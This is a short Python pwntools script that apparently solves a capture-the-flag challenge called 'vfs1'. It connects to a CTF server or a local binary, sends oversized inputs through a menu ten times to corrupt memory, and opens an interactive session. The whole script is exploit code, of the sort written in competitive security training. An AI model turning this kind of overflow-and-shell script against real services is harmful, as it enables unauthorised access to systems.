#!/usr/bin/python3

from pwn import *

exe = ELF('vfs1', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*main+355

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('byuctf.xyz', 40008)
else:
    p = process(exe.path)

GDB()


def option1():
    sla(b"> ", b"1")
    sla(b"> ", b"a"*32)
    sla(b"> ", b"1"*256)


for i in range(10):
    option1()
sla(b"> ", b"4")
sla(b"> ", b"0")

p.interactive()
